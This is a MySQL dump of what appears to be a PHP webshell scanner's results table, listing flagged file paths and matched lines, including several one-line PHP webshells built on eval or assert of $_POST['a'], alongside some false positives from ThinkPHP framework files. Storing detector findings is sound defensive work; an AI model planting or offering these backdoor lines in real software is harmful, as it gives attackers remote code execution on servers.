-- MySQL dump 10.13  Distrib 5.7.19, for osx10.9 (x86_64)
--
-- Host: localhost    Database: scan
-- ------------------------------------------------------
-- Server version	5.7.19-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `scan_table`
--

DROP TABLE IF EXISTS `scan_table`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `scan_table` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `project` text,
  `filepath` text,
  `code` text,
  `time` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=276 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `scan_table`
--

LOCK TABLES `scan_table` WRITE;
/*!40000 ALTER TABLE `scan_table` DISABLE KEYS */;
INSERT INTO `scan_table` VALUES (263,'22','../scan/scan_file/22/22/shell.php','@eval($_POST[\'a\']);\n','1568617665'),(264,'22','../scan/scan_file/22/22/11.php','<?php @assert($_POST[\'a\']); ?>','1568617665'),(265,'www','./scan/scan_file/www/www/shell.php','@eval($_POST[\'a\']);\n','1568617709'),(266,'www','./scan/scan_file/www/www/11.php','<?php @assert($_POST[\'a\']); ?>','1568617709'),(267,'www','./scan/scan_file/www/www/core/view/Parser.php','        self::$content = preg_replace(\'/(phpinfo([s]+)?()/i\', \'//$1\', self::$content);\n','1568617709'),(268,'test','./scan/scan_file/test/test/shell.php','@eval($_POST[\'a\']);\n','1568620326'),(269,'test','./scan/scan_file/test/test/11.php','<?php @assert($_POST[\'a\']); ?>','1568620326'),(270,'test','./scan/scan_file/test/test/shell.php','@eval($_POST[\'a\']);\n','1568621690'),(271,'test','./scan/scan_file/test/test/11.php','<?php @assert($_POST[\'a\']); ?>','1568621690'),(272,'scan','./scan/scan_file/scan/scan/webshell.txt','<?php eval($_POST[\'a\']);?>','1569831410'),(273,'scan','./scan/scan_file/scan/scan/file/1/µû░σ╗║µûçµ£¼µûçµíú.txt','<?php @assert($_POST[\'a\']); ?>','1569831410'),(274,'test','./scan/scan_file/test/thinkphp/library/think/Process.php','        if (!function_exists(\'phpinfo\')) {\n','1569831424'),(275,'test','./scan/scan_file/test/thinkphp/library/think/process/Builder.php','            // include $_ENV for BC purposes\n','1569831424');
/*!40000 ALTER TABLE `scan_table` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-09-30 16:43:45
